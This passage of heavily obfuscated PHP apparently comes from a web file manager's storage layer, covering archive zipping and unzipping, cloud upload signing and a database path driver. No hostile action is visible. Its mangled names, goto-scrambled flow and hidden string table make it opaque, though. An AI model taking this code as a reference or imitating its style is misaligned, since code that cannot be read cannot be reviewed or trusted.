$DÙÍ½‹Ô‘ö[6] => $Açœí¢•™Ÿ); $aôàõƒ§„² = Model($DÙÍ½‹Ô‘ö[536])->getInfo($Açœí¢•™Ÿ[$DÙÍ½‹Ô‘ö[367]]); if ($aôàõƒ§„²[$DÙÍ½‹Ô‘ö[369]] == $DÙÍ½‹Ô‘ö[468]) { $D»É¬ğ¿ˆÖ = KodIO::clear($aôàõƒ§„²[$DÙÍ½‹Ô‘ö[1018]] . $Açœí¢•™Ÿ[$DÙÍ½‹Ô‘ö[1011]]); $Açœí¢•™Ÿ[$DÙÍ½‹Ô‘ö[439]] = $aôàõƒ§„²; $Açœí¢•™Ÿ[$DÙÍ½‹Ô‘ö[997]] = $D»É¬ğ¿ˆÖ; $a™¢¹ˆ£¦é = array($DÙÍ½‹Ô‘ö[1013] => $DÙÍ½‹Ô‘ö[1021], $DÙÍ½‹Ô‘ö[6] => $Açœí¢•™Ÿ); } else { if (!$D»É¬ğ¿ˆÖ) { $D»É¬ğ¿ˆÖ = $aôàõƒ§„²[$DÙÍ½‹Ô‘ö[369]]; } } break; default: $D»É¬ğ¿ˆÖ = $Açœí¢•™Ÿ[$DÙÍ½‹Ô‘ö[75]]; $a™¢¹ˆ£¦é = array($DÙÍ½‹Ô‘ö[1013] => $DÙÍ½‹Ô‘ö[1022]); break; } $aÏƒßˆšÎ = $Açœí¢•™Ÿ[$DÙÍ½‹Ô‘ö[75]]; if (!isset(self::$driverCache[$aÏƒßˆšÎ])) { $EÄ‹ÊÖ² = strtolower($a™¢¹ˆ£¦é[$DÙÍ½‹Ô‘ö[90]]); $e÷Ò¬‡—ÁÓ = $GLOBALS[$DÙÍ½‹Ô‘ö[6]][$DÙÍ½‹Ô‘ö[84]][$DÙÍ½‹Ô‘ö[750]]; $A›ÈÆĞÆ¾Ÿ = $DÙÍ½‹Ô‘ö[71] . (isset($e÷Ò¬‡—ÁÓ[$EÄ‹ÊÖ²]) ? $e÷Ò¬‡—ÁÓ[$EÄ‹ÊÖ²] : ucfirst($EÄ‹ÊÖ²)); if (!class_exists($A›ÈÆĞÆ¾Ÿ)) { show_json("{$A›ÈÆĞÆ¾Ÿ}\40\x6e\157\x74\40\x65\170\x69\x73\164\x73\x21", !1); } $c„˜¦ÊÌ† = isset($a™¢¹ˆ£¦é[$DÙÍ½‹Ô‘ö[6]]) ? $a™¢¹ˆ£¦é[$DÙÍ½‹Ô‘ö[6]] : !1; self::$driverCache[$aÏƒßˆšÎ] = new $A›ÈÆĞÆ¾Ÿ($c„˜¦ÊÌ†); } goto C¯å šÂ’; a‘¶ İ•ä³: $DÙÍ½‹Ô‘ö =& $_SERVER[¼€¼ˆ¦‚¡]; $c‘çŞš‰¢ª = $Açœí¢•™Ÿ[$DÙÍ½‹Ô‘ö[1012]]; $eÖ²‡ò®– = $Açœí¢•™Ÿ[$DÙÍ½‹Ô‘ö[367]]; goto DŠã¹·†¾; eØˆõá¯˜: $fé¡¿’£›->path = $D»É¬ğ¿ˆÖ; return $fé¡¿’£›; goto e×Í²ï£”; C¯å šÂ’: $fé¡¿’£› = self::$driverCache[$aÏƒßˆšÎ]; $fé¡¿’£›->pathDriver = $c‘çŞš‰¢ª; $fé¡¿’£›->pathBase = $DÙÍ½‹Ô‘ö[33]; goto F…‹ÆÍ½Øô; F…‹ÆÍ½Øô: if (isset($a™¢¹ˆ£¦é[$DÙÍ½‹Ô‘ö[6]][$DÙÍ½‹Ô‘ö[1023]])) { $fé¡¿’£›->pathBase = rtrim($a™¢¹ˆ£¦é[$DÙÍ½‹Ô‘ö[6]][$DÙÍ½‹Ô‘ö[1023]], $DÙÍ½‹Ô‘ö[8]) . $DÙÍ½‹Ô‘ö[8]; $D»É¬ğ¿ˆÖ = $fé¡¿’£›->pathBase . ltrim($D»É¬ğ¿ˆÖ, $DÙÍ½‹Ô‘ö[8]); } $D»É¬ğ¿ˆÖ = $fé¡¿’£›->getPath($D»É¬ğ¿ˆÖ); if (isset($Açœí¢•™Ÿ[$DÙÍ½‹Ô‘ö[997]])) { $D»É¬ğ¿ˆÖ = $Açœí¢•™Ÿ[$DÙÍ½‹Ô‘ö[997]]; } goto eØˆõá¯˜; e×Í²ï£”: } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $f¥ÎÀÎÕ÷; if (!$f¥ÎÀÎÕ÷) { $EˆÈƒ…‚Œ— = IO::init($_SERVER[¼€¼ˆ¦‚¡][8]); } return $EˆÈƒ…‚Œ—; } private static function iconvSystem($F¬ˆ©¦³Ó) { return self::local()->iconvSystem($F¬ˆ©¦³Ó); } private static function iconvApp($B‹Ş˜ïå¡) { return self::local()->iconvApp($B‹Ş˜ïå¡); } public static function zip($d±›¹æÅ, $fÂ„¹“¢¼é = "\x7a\151\160", $b«Ç™Ö½íÛ = '', $d‹†ãëˆº” = REPEAT_RENAME) { goto dõÆ½Ã½’; C²‡‹İ¦öÎ: if (count($dŒÕõøà—¡) > 1) { $fÓ“—¿Ï‚… = IO::info(IO::pathFather($fÜéîÖ‰¯Õ[$EÚÕ×í›“Ú[75]])); $e©õ…­Ö = $fÓ“—¿Ï‚…[$EÚÕ×í›“Ú[28]]; } $a¶½Æ˜ì»õ = $Eå¢İ—©™; if (!$a¶½Æ˜ì»õ) { $a¶½Æ˜ì»õ = get_path_father($fÜéîÖ‰¯Õ[$EÚÕ×í›“Ú[75]]); $D©­Ö‹áŠÀ = IO::info($a¶½Æ˜ì»õ); if (!$D©­Ö‹áŠÀ[$EÚÕ×í›“Ú[189]]) { show_json(LNG($EÚÕ×í›“Ú[1025]), !1); } } goto A¹æõ¢›‰Ğ; AÖâìó£ÑÚ: $Eå¢İ—©™ = !1; if (!$b«Ç™Ö½íÛ && $B©ŞçØã†¥->getType() == $EÚÕ×í›“Ú[102]) { $dŒÕõøà—¡ = self::zipFileList($d±›¹æÅ); } else { $Eå¢İ—©™ = $b«Ç™Ö½íÛ ? $b«Ç™Ö½íÛ : TEMP_FILES . $EÚÕ×í›“Ú[1024] . time() . rand_string(8) . $EÚÕ×í›“Ú[8]; mk_dir($Eå¢İ—©™); $dŒÕõøà—¡ = self::zipFileList($d±›¹æÅ, $Eå¢İ—©™); } $e©õ…­Ö = $fÜéîÖ‰¯Õ[$EÚÕ×í›“Ú[28]]; goto C²‡‹İ¦öÎ; A¹æõ¢›‰Ğ: $aéÒ‹‰÷¡ = $a¶½Æ˜ì»õ . $e©õ…­Ö . $EÚÕ×í›“Ú[91] . $fÂ„¹“¢¼é; $aéÒ‹‰÷¡ = get_filename_auto($aéÒ‹‰÷¡, $EÚÕ×í›“Ú[33], $d‹†ãëˆº”); $B¤èŞ­Ú¦– = self::iconvSystem($aéÒ‹‰÷¡); goto c”¸‹¢¢Ü; c”¸‹¢¢Ü: foreach ($dŒÕõøà—¡ as $cà™¯àÏßÎ => $b©Îñçõ’¼) { $dŒÕõøà—¡[$cà™¯àÏßÎ] = self::iconvSystem($b©Îñçõ’¼); } KodArchive::create($B¤èŞ­Ú¦–, $dŒÕõøà—¡); if (!IO::exist($aéÒ‹‰÷¡)) { if ($Eå¢İ—©™) { del_dir($Eå¢İ—©™); } show_json(LNG($EÚÕ×í›“Ú[1026]), !1); } goto cËÁ«Ğ­Ü­; cËÁ«Ğ­Ü­: if ($b«Ç™Ö½íÛ || !$Eå¢İ—©™) { if ($Eå¢İ—©™ && strstr($Eå¢İ—©™, TEMP_FILES)) { $a¼ ƒ™ˆá„ = $dŒÕõøà—¡ = array(); recursion_dir($a¶½Æ˜ì»õ, $a¼ ƒ™ˆá„, $dŒÕõøà—¡, 0); foreach ($a¼ ƒ™ˆá„ as $aï¾éò¡ôÑ) { del_dir($aï¾éò¡ôÑ); } foreach ($dŒÕõøà—¡ as $FÛ¹à»ƒğÙ) { if ($FÛ¹à»ƒğÙ == $B¤èŞ­Ú¦–) { continue; } del_file($FÛ¹à»ƒğÙ); } } return $aéÒ‹‰÷¡; } $B©ó¼Ì¥¢‹ = self::pathFather($fÜéîÖ‰¯Õ[$EÚÕ×í›“Ú[75]]); $c÷Ë”¢¶Û = self::move($aéÒ‹‰÷¡, $B©ó¼Ì¥¢‹, $d‹†ãëˆº”); goto d¶Ù¤œõƒâ; d¶Ù¤œõƒâ: if (!$c÷Ë”¢¶Û) { del_dir($Eå¢İ—©™); show_json(LNG($EÚÕ×í›“Ú[1026]), !1); } del_dir($Eå¢İ—©™); return $c÷Ë”¢¶Û; goto d ËŠ †¿ ; dõÆ½Ã½’: $EÚÕ×í›“Ú =& $_SERVER[¼€¼ˆ¦‚¡]; $B©ŞçØã†¥ = self::init($d±›¹æÅ[0][$EÚÕ×í›“Ú[75]]); $fÜéîÖ‰¯Õ = self::info($d±›¹æÅ[0][$EÚÕ×í›“Ú[75]]); goto AÖâìó£ÑÚ; d ËŠ †¿ : } public static function unzip($bÑÑğ™Ê¹÷, $f¬ÁÉèÖÕ = "\x72\x65\160\154\141\143\x65") { goto D•³šÆ¡Ç; CóÚ†”õ¨: if (!($cÎğ“èÇ†ğ = parent::info($FÂ³–õ¼Şå))) { show_json(LNG($b’È¥®ñ¤[1028]), !1); } if (!($EŞ­ˆ¤ì = parent::infoFull($aÛÛÇ‹èğé))) { $aÛÛÇ‹èğé = parent::mkdir($aÛÛÇ‹èğé); $EŞ­ˆ¤ì = array($b’È¥®ñ¤[75] => $aÛÛÇ‹èğé); } else { if (isset($EŞ­ˆ¤ì[$b’È¥®ñ¤[369]]) && trim($EŞ­ˆ¤ì[$b’È¥®ñ¤[75]], $b’È¥®ñ¤[8]) != trim($aÛÛÇ‹èğé, $b’È¥®ñ¤[8])) { $AÎÑÇÚê¢ = KodIO::make($EŞ­ˆ¤ì[$b’È¥®ñ¤[461]]); $FÔ³Åñù† = parent::fileNameAuto($AÎÑÇÚê¢, $EŞ­ˆ¤ì[$b’È¥®ñ¤[28]], REPEAT_RENAME_FOLDER, !0); $aÛÛÇ‹èğé = parent::mkdir($AÎÑÇÚê¢ . $FÔ³Åñù†); $EŞ­ˆ¤ì = array($b’È¥®ñ¤[75] => $aÛÛÇ‹èğé); } } $aÛÛÇ‹èğé = $EŞ­ˆ¤ì[$b’È¥®ñ¤[75]]; goto b»»‡®™£; B¹ŸÀ·³Š³: return !0; goto E›´ª²ƒŞó; aÇˆêÚ­ø¥: mk_dir($B¿Ú±¨Ûœà); $Cí×¡›Â‰ø = self::fileExt($cÎğ“èÇ†ğ); $f¢‘È¡èØß = $B¿Ú±¨Ûœà . $b’È¥®ñ¤[91] . $Cí×¡›Â‰ø; goto b²¾¶Şï; CÁ÷ğùÔ: Hook::trigger($b’È¥®ñ¤[1034], $B¿Ú±¨Ûœà); recursion_dir($B¿Ú±¨Ûœà, $E–Îçóº¬ö, $D‡‰âß©™ƒ, 0); $EÎ«å›Ã = array_merge($E–Îçóº¬ö, $D‡‰âß©™ƒ); goto dˆ’¾±¼ŸÃ; D•³šÆ¡Ç: $b’È¥®ñ¤ =& $_SERVER[¼€¼ˆ¦‚¡]; $FÂ³–õ¼Şå = $bÑÑğ™Ê¹÷[$b’È¥®ñ¤[75]]; $aÛÛÇ‹èğé = $bÑÑğ™Ê¹÷[$b’È¥®ñ¤[1027]]; goto CóÚ†”õ¨; f³‹Å•ª: $e´ÇÃŸˆ·Ã = KodArchive::extract($f¢‘È¡èØß, $B¿Ú±¨Ûœà . $b’È¥®ñ¤[8], $D¶¼êÉÃ‹); self::archiveExt(); if (!$e´ÇÃŸˆ·Ã[$b’È¥®ñ¤[1031]]) { show_json($b’È¥®ñ¤[1032] . $e´ÇÃŸˆ·Ã[$b’È¥®ñ¤[1033]], !1); } goto CÁ÷ğùÔ; b»»‡®™£: $a‡™õÍƒê² = self::tmpFileName($cÎğ“èÇ†ğ); $B¿Ú±¨Ûœà = TEMP_FILES . $a‡™õÍƒê²; del_dir($B¿Ú±¨Ûœà); goto aÇˆêÚ­ø¥; b²¾¶Şï: if (!@file_exists(self::iconvSystem($f¢‘È¡èØß))) { $e’Û–¤š· = self::localFilePath($FÂ³–õ¼Şå, $Cí×¡›Â‰ø); $f¢‘È¡èØß = $e’Û–¤š· ? $e’Û–¤š· : parent::download($FÂ³–õ¼Şå, $f¢‘È¡èØß); } $f¢‘È¡èØß = self::iconvSystem($f¢‘È¡èØß); $D¶¼êÉÃ‹ = isset($bÑÑğ™Ê¹÷[$b’È¥®ñ¤[1029]]) ? $bÑÑğ™Ê¹÷[$b’È¥®ñ¤[1029]] : $b’È¥®ñ¤[1030]; goto f³‹Å•ª; dˆ’¾±¼ŸÃ: foreach ($EÎ«å›Ã as $dÒà¸’÷Î‹) { $dÒà¸’÷Î‹ = self::iconvApp($dÒà¸’÷Î‹); self::move($dÒà¸’÷Î‹, $aÛÛÇ‹èğé, $f¬ÁÉèÖÕ); } del_dir($B¿Ú±¨Ûœà); if (!$e’Û–¤š·) { del_file($f¢‘È¡èØß); } goto B¹ŸÀ·³Š³; E›´ª²ƒŞó: } public static function unzipList($dÂÃòšÜÜ) { goto c‡³í¤†£Ì; B¿ñ›âèš°: $D¼…×½ÓÀ = json_encode($dñšìºä¦¶[$C›Ü‰íèÊ[1033]]); self::setContent($BÎ°ÖËÜÑ, $D¼…×½ÓÀ); if (count($dñšìºä¦¶[$C›Ü‰íèÊ[1033]]) >= $D¢¡§ô™…‹) { show_json(sprintf(LNG($C›Ü‰íèÊ[1037]), count($dñšìºä¦¶[$C›Ü‰íèÊ[1033]])), !1); } goto E¶“Ã× ˆ†; AÏéÍíå÷Â: if (isset($c¢Í†…À¢)) { $C‚®Â®«‰ç = array($c¢Í†…À¢[$C›Ü‰íèÊ[75]], $c¢Í†…À¢[$C›Ü‰íèÊ[1035]], $c¢Í†…À¢[$C›Ü‰íèÊ[28]]); $D‘×‰Ú¯ï = md5(implode($C›Ü‰íèÊ[70], $C‚®Â®«‰ç)) . $C›Ü‰íèÊ[91] . get_path_ext($c¢Í†…À¢[$C›Ü‰íèÊ[28]]); } else { $C‚®Â®«‰ç = array($A“µ·àŒ„[$C›Ü‰íèÊ[28]], $A“µ·àŒ„[$C›Ü‰íèÊ[75]], $A“µ·àŒ„[$C›Ü‰íèÊ[77]]); $D‘×‰Ú¯ï = md5(implode($C›Ü‰íèÊ[70], $C‚®Â®«‰ç)) . $C›Ü‰íèÊ[91] . $D‚ëø«©Ûª; } if ($Dˆ÷ëóª† == -1) { $BÎ°ÖËÜÑ = IO_PATH_SYSTEM_TEMP . "\172\x69\160\126\151\x65\167\x2f{$fÊØ™ßØ‡Ç}\57{$D‘×‰Ú¯ï}\x2e\154\x6f\x67"; $Eì‘¹–Å¹ = self::infoFull($BÎ°ÖËÜÑ); if ($Eì‘¹–Å¹) { $BÎ°ÖËÜÑ = $Eì‘¹–Å¹[$C›Ü‰íèÊ[75]]; $FÊ’‹Ûƒ£‡ = self::getContent($BÎ°ÖËÜÑ); if ($FÊ’‹Ûƒ£‡) { $D¼…×½ÓÀ = json_decode($FÊ’‹Ûƒ£‡, !0); if (count($D¼…×½ÓÀ) >= $D¢¡§ô™…‹) { show_json(sprintf(LNG($C›Ü‰íèÊ[1037]), count($D¼…×½ÓÀ)), !1); } return $D¼…×½ÓÀ; } } else { $BÎ°ÖËÜÑ = self::mkfile($BÎ°ÖËÜÑ); } } $b‘´İØù = TEMP_FILES . $fÊØ™ßØ‡Ç; goto dª‹Îèµçß; c‡³í¤†£Ì: $C›Ü‰íèÊ =& $_SERVER[¼€¼ˆ¦‚¡]; $Dâî¿¤ŒÎÄ = $dÂÃòšÜÜ[$C›Ü‰íèÊ[75]]; $Dˆ÷ëóª† = isset($dÂÃòšÜÜ[$C›Ü‰íèÊ[1035]]) ? $dÂÃòšÜÜ[$C›Ü‰íèÊ[1035]] : -1; goto Aš£‰è©ôÙ; Aš£‰è©ôÙ: $D¢¡§ô™…‹ = 50000; if (request_url_safe($Dâî¿¤ŒÎÄ)) { $c¢Í†…À¢ = parse_url_query($Dâî¿¤ŒÎÄ); if (!isset($c¢Í†…À¢[$C›Ü‰íèÊ[75]])) { show_json($C›Ü‰íèÊ[1036], !1); } } $E×íÄ¨™é„ = isset($c¢Í†…À¢) ? $c¢Í†…À¢[$C›Ü‰íèÊ[75]] : $Dâî¿¤ŒÎÄ; goto Aá„©²Ø¬; Aá„©²Ø¬: $A“µ·àŒ„ = self::info($E×íÄ¨™é„); $D‚ëø«©Ûª = self::fileExt($A“µ·àŒ„); $fÊØ™ßØ‡Ç = self::tmpFileName($A“µ·àŒ„); goto AÏéÍíå÷Â; E¶“Ã× ˆ†: return $dñšìºä¦¶[$C›Ü‰íèÊ[1033]]; goto EÂÖªÆƒİø; dª‹Îèµçß: if (!is_dir($b‘´İØù)) { mk_dir($b‘´İØù); } $BœÄßÅÔœÇ = $b‘´İØù . $C›Ü‰íèÊ[8] . $D‘×‰Ú¯ï; if (!@file_exists(self::iconvSystem($BœÄßÅÔœÇ))) { if (isset($c¢Í†…À¢)) { url_request($Dâî¿¤ŒÎÄ, $C›Ü‰íèÊ[1038], $BœÄßÅÔœÇ); } else { $Fš‚‡çÖğÒ = self::localFilePath($Dâî¿¤ŒÎÄ, $D‚ëø«©Ûª); $BœÄßÅÔœÇ = $Fš‚‡çÖğÒ ? $Fš‚‡çÖğÒ : self::download($Dâî¿¤ŒÎÄ, $BœÄßÅÔœÇ); } } goto C«˜÷÷Ö‘º; C«˜÷÷Ö‘º: $BœÄßÅÔœÇ = self::iconvSystem($BœÄßÅÔœÇ); if ($Dˆ÷ëóª† >= 0) { $A…•‰š…Ş = isset($dÂÃòšÜÜ[$C›Ü‰íèÊ[1039]]) ? $dÂÃòšÜÜ[$C›Ü‰íèÊ[1039]] : !1; $fÉ‚ÄÈ·¡î = isset($dÂÃòšÜÜ[$C›Ü‰íèÊ[28]]) ? $dÂÃòšÜÜ[$C›Ü‰íèÊ[28]] : $C›Ü‰íèÊ[33]; KodArchive::filePreview($BœÄßÅÔœÇ, $Dˆ÷ëóª†, $A…•‰š…Ş, $fÉ‚ÄÈ·¡î); self::archiveExt(); die; } $dñšìºä¦¶ = KodArchive::listContent($BœÄßÅÔœÇ); goto cÆ¶ŞåÏ§ò; cÆ¶ŞåÏ§ò: self::archiveExt(); del_dir($b‘´İØù); if (!$dñšìºä¦¶[$C›Ü‰íèÊ[1031]]) { show_json($dñšìºä¦¶[$C›Ü‰íèÊ[1033]], !1); } goto B¿ñ›âèš°; EÂÖªÆƒİø: } private static function fileExt($C†‘Š²İ‘ğ) { $D†ÜèŞï  =& $_SERVER[¼€¼ˆ¦‚¡]; $b×–Í­‚ ï = $C†‘Š²İ‘ğ[$D†ÜèŞï [160]]; if ($b×–Í­‚ ï == $D†ÜèŞï [1040]) { $Dã·Ÿù¿ğ = $D†ÜèŞï [1041]; if (substr($C†‘Š²İ‘ğ[$D†ÜèŞï [28]], -strlen($Dã·Ÿù¿ğ)) == $Dã·Ÿù¿ğ) { $b×–Í­‚ ï = $D†ÜèŞï [1042]; } } self::archiveExt($b×–Í­‚ ï); return $b×–Í­‚ ï; } private static function zipFileList($E‡ÆÇ‡–²ö, $Bï™Û³Û‰÷ = false) { $då•¨‰‰— =& $_SERVER[¼€¼ˆ¦‚¡]; $B¯¡°˜·µÇ = array(); foreach ($E‡ÆÇ‡–²ö as $bî‰¢’ù²ğ) { $DåÌ†…íØæ = $bî‰¢’ù²ğ[$då•¨‰‰—[75]]; if ($Bï™Û³Û‰÷) { $DåÌ†…íØæ = self::copy($bî‰¢’ù²ğ[$då•¨‰‰—[75]], $Bï™Û³Û‰÷, $då•¨‰‰—[741]); } if ($DåÌ†…íØæ && self::local()->exist($DåÌ†…íØæ)) { $B¯¡°˜·µÇ[$bî‰¢’ù²ğ[$då•¨‰‰—[75]]] = $DåÌ†…íØæ; } } if (!empty($B¯¡°˜·µÇ)) { return array_values($B¯¡°˜·µÇ); } show_json(LNG($då•¨‰‰—[1043]), !1); } public static function tmpFileName($CòÅøµ‹¸ö) { $CæÏˆ¤ìÜ± =& $_SERVER[¼€¼ˆ¦‚¡]; $AÍ”¬ŠôÎ­ = array($CòÅøµ‹¸ö[$CæÏˆ¤ìÜ±[28]], $CòÅøµ‹¸ö[$CæÏˆ¤ìÜ±[75]], $CòÅøµ‹¸ö[$CæÏˆ¤ìÜ±[77]], $CòÅøµ‹¸ö[$CæÏˆ¤ìÜ±[459]]); return md5(implode($CæÏˆ¤ìÜ±[70], $AÍ”¬ŠôÎ­)); } private static function localFilePath($Dö˜¤”†ĞŞ, $EùÅµˆ») { goto b¼À‹×ĞÁó; CÂ‡öáø½¦: if ($c÷¯†ÂÓ‘Á == $bª‘çç†¦[102] || $c÷¯†ÂÓ‘Á == $bª‘çç†¦[1047]) { if (!$Aƒ±–->exist($Aƒ±–->path)) { show_json(LNG($bª‘çç†¦[101]), !1); } return $Aƒ±–->path; } return !1; goto Bµ‚‚Ç¤À; b¼À‹×ĞÁó: $bª‘çç†¦ =& $_SERVER[¼€¼ˆ¦‚¡]; if ($EùÅµˆ» == $bª‘çç†¦[1044] && strtoupper(substr(PHP_OS, 0, 3)) == $bª‘çç†¦[1045]) { return !1; } $bƒÖîÅ¾ß£ = KodIO::parse($Dö˜¤”†ĞŞ); goto E×Èùø˜; E×Èùø˜: if ($bƒÖîÅ¾ß£[$bª‘çç†¦[29]] == KodIO::KOD_SOURCE) { $e‚¾‰×ƒ· = Model($bª‘çç†¦[749])->fileInfoGet(KodIO::sourceID($Dö˜¤”†ĞŞ)); if (!$e‚¾‰×ƒ·[$bª‘çç†¦[75]]) { show_json($bª‘çç†¦[1046], !1); } $Dö˜¤”†ĞŞ = $e‚¾‰×ƒ·[$bª‘çç†¦[75]]; } $Aƒ±– = self::init($Dö˜¤”†ĞŞ); $c÷¯†ÂÓ‘Á = $Aƒ±–->getType(); goto CÂ‡öáø½¦; Bµ‚‚Ç¤À: } private static function archiveExt($fÆ£ŸĞÏÃö = '') { $GLOBALS[$_SERVER[¼€¼ˆ¦‚¡][1048]] = $fÆ£ŸĞÏÃö; } } $CÆù¢é’æÙ = LIB_DIR . $_SERVER[¼€¼ˆ¦‚¡][785]; goto B½ÙÕ¢×ª‰; Bâë”¼”ÇÑ: define($_SERVER[¼€¼ˆ¦‚¡][0], $_SERVER[¼€¼ˆ¦‚¡][1]); $_SERVER[¿‰šÇ ] = explode($_SERVER[¼€¼ˆ¦‚¡][2], gzinflate(substr($_SERVER[¼€¼ˆ¦‚¡][3], 10, -8))); function Model($E¼ªäØÚŠÈ = '', $f¤å–ËŠÖÎ = '', $Bß¤Ä‘¼—Ş = '') { goto CŒ¤Á˜°»Ñ; CŒ¤Á˜°»Ñ: $E¡¤Â®‹¶ =& $_SERVER[¿‰šÇ ]; static $Dîó…ƒ©ĞË = array(); $C‰îÖáŞ™™ = strtolower($f¤å–ËŠÖÎ . $E¡¤Â®‹¶[0] . $E¼ªäØÚŠÈ); goto E¨«šãíùÅ; E¨«šãíùÅ: if (isset($Dîó…ƒ©ĞË[$C‰îÖáŞ™™])) { return $Dîó…ƒ©ĞË[$C‰îÖáŞ™™]; } if ($E¼ªäØÚŠÈ) { $E¼ªäØÚŠÈ = strtoupper($E¼ªäØÚŠÈ[0]) . substr($E¼ªäØÚŠÈ, 1); $F™æÈå—ËÁ = $E¼ªäØÚŠÈ . $E¡¤Â®‹¶[1]; if (class_exists($F™æÈå—ËÁ)) { $Dîó…ƒ©ĞË[$C‰îÖáŞ™™] = new $F™æÈå—ËÁ(); return $Dîó…ƒ©ĞË[$C‰îÖáŞ™™]; } } if (!$Bß¤Ä‘¼—Ş) { $Bß¤Ä‘¼—Ş = $GLOBALS[$E¡¤Â®‹¶[2]][$E¡¤Â®‹¶[3]]; } goto bÊ‰½ëñ„; bÊ‰½ëñ„: $Dîó…ƒ©ĞË[$C‰îÖáŞ™™] = new ModelBase($E¼ªäØÚŠÈ, $f¤å–ËŠÖÎ, $Bß¤Ä‘¼—Ş); return $Dîó…ƒ©ĞË[$C‰îÖáŞ™™]; goto f©÷ÙÃ¼ö¦; f©÷ÙÃ¼ö¦: } goto dó‹ã¿ß†¯; D®ëëˆŠÏ«: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($Bƒ»—¦È„´) { parent::__construct($Bƒ»—¦È„´); $this->signatureVersion($_SERVER[¼€¼ˆ¦‚¡][200]); } public function uploadFormData($dÈ­ÜæéÃ, $cË’˜ÊŸ = 3600) { goto Cíó—îÈÂ; a½¥ èÌ±·: $BõØô«íÊ = sha1($eéÔÅ¯ĞÙ‚); $Cï²¨Áİ†â = hash_hmac($AöˆÎ‚ÄÏ[218], $BõØô«íÊ, $b‚ã”»øî¿); $DÒØïæ­¹ = array($AöˆÎ‚ÄÏ[1104] => $E» ºÅ»¯‰, $AöˆÎ‚ÄÏ[1108] => $E‚Ñ„øÓ­†, $AöˆÎ‚ÄÏ[1112] => base64_encode($eéÔÅ¯ĞÙ‚), $AöˆÎ‚ÄÏ[1109] => $aÓ²¬¼›Á, $AöˆÎ‚ÄÏ[1110] => $this->accessKey, $AöˆÎ‚ÄÏ[1113] => $Dæ¿ŸäŒµÍ, $AöˆÎ‚ÄÏ[1114] => $Cï²¨Áİ†â, $AöˆÎ‚ÄÏ[169] => $this->getHost()); goto C”³Ù–ßÎË; bä‚¸Àí•ê: $E‚Ñ„øÓ­† = $AöˆÎ‚ÄÏ[1100]; $aŠœÌ²ˆŞ = gmdate($AöˆÎ‚ÄÏ[1101], time() + $cË’˜ÊŸ); $Dæ¿ŸäŒµÍ = (string) time() . $AöˆÎ‚ÄÏ[67] . (string) (time() + $cË’˜ÊŸ); goto bĞ´ÈŒéö›; Cíó—îÈÂ: $AöˆÎ‚ÄÏ =& $_SERVER[¼€¼ˆ¦‚¡]; $E» ºÅ»¯‰ = $AöˆÎ‚ÄÏ[185]; $aÓ²¬¼›Á = $AöˆÎ‚ÄÏ[218]; goto bä‚¸Àí•ê; bĞ´ÈŒéö›: $eéÔÅ¯ĞÙ‚ = array($AöˆÎ‚ÄÏ[1102] => $aŠœÌ²ˆŞ, $AöˆÎ‚ÄÏ[1103] => array(array($AöˆÎ‚ÄÏ[1104] => $E» ºÅ»¯‰), array($AöˆÎ‚ÄÏ[1105] => $this->bucket), array($AöˆÎ‚ÄÏ[1106], $AöˆÎ‚ÄÏ[1107], $AöˆÎ‚ÄÏ[33]), array($AöˆÎ‚ÄÏ[1108] => $E‚Ñ„øÓ­†), array($AöˆÎ‚ÄÏ[1109] => $aÓ²¬¼›Á), array($AöˆÎ‚ÄÏ[1110] => $this->accessKey), array($AöˆÎ‚ÄÏ[1111] => $Dæ¿ŸäŒµÍ))); $eéÔÅ¯ĞÙ‚ = json_encode($eéÔÅ¯ĞÙ‚); $b‚ã”»øî¿ = hash_hmac($AöˆÎ‚ÄÏ[218], $Dæ¿ŸäŒµÍ, $this->secret); goto a½¥ èÌ±·; C”³Ù–ßÎË: return $DÒØïæ­¹; goto DëñãÜ˜¼‹; DëñãÜ˜¼‹: } public function fileOutLink($AÏÛäºâº) { $cÒÒ®½Éê½ =& $_SERVER[¼€¼ˆ¦‚¡]; if (substr($AÏÛäºâº, 0, 7) == $cÒÒ®½Éê½[1115]) { $AÏÛäºâº = $cÒÒ®½Éê½[1116] . substr($AÏÛäºâº, 7); } header($cÒÒ®½Éê½[156] . $AÏÛäºâº); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($D¤¼ëíö¨‘) { $this->pathParse = $D¤¼ëíö¨‘; $this->model = Model($_SERVER[¼€¼ˆ¦‚¡][1117]); } public function getPath($a…‰¿°ìÍ¢) { return trim($a…‰¿°ìÍ¢, $_SERVER[¼€¼ˆ¦‚¡][8]); } public function pathFather($A¹ÛóàÃ³¡) { $fÔÜÆÑëÌÇ = $this->parse($A¹ÛóàÃ³¡); $fÔÜÆÑëÌÇ = $this->infoSimple($A¹ÛóàÃ³¡); return $fÔÜÆÑëÌÇ ? $fÔÜÆÑëÌÇ[$_SERVER[¼€¼ˆ¦‚¡][461]] : !1; } public function getPathName($b¥‡Á–™‹—) { $eî–•ÆÛÄ = $this->infoSimple($b¥‡Á–™‹—); return $eî–•ÆÛÄ ? $eî–•ÆÛÄ[$_SERVER[¼€¼ˆ¦‚¡][28]] : !1; } public function getPathOuter($CèÊ§À¸”) { if (!$CèÊ§À¸”) { return $CèÊ§À¸”; } $dğ¥Æ²ùìÁ = $this->parse($CèÊ§À¸”); return KodIO::make($dğ¥Æ²ùìÁ[$_SERVER[¼€¼ˆ¦‚¡][367]]); } public function copyFolderFromIO($D›•å¼È, $e§†”‚¼ø®, $a…ÔÓÏ¼, $E•³‚•¾´å, $b®‹÷¿“„œ) { $Eô”õ©ÄŒ³ = $this->model->copyFolderFromIO($D›•å¼È, $e§†”‚¼ø®, $a…ÔÓÏ¼, $E•³‚•¾´å, $b®‹÷¿“„œ); return KodIO::make($Eô”õ©ÄŒ³); } public function isParentOf($B‡Ø›¬±, $D·’¶ëñàê) { return $this->model->isParentOf($B‡Ø›¬±, $D·’¶ëñàê); } public function mkfile($cÀÌù»–ÏŒ, $eò„ğ¾à¯ = '', $C´Ÿéº–ìÔ = REPEAT_RENAME) { $b–ªé¤Å¶¶ =& $_SERVER[¼€¼ˆ¦‚¡]; $f¡İÎ¨Ë”Ş = $this->parse($cÀÌù»–ÏŒ); $cÀÌù»–ÏŒ = $f¡İÎ¨Ë”Ş[$b–ªé¤Å¶¶[367]]; for ($bè­†Äªàğ = 0; $bè­†Äªàğ < count($f¡İÎ¨Ë”Ş[$b–ªé¤Å¶¶[1118]]); $bè­†Äªàğ++) { $fì­›Õƒ = $f¡İÎ¨Ë”Ş[$b–ªé¤Å¶¶[1118]][$bè­†Äªàğ]; if 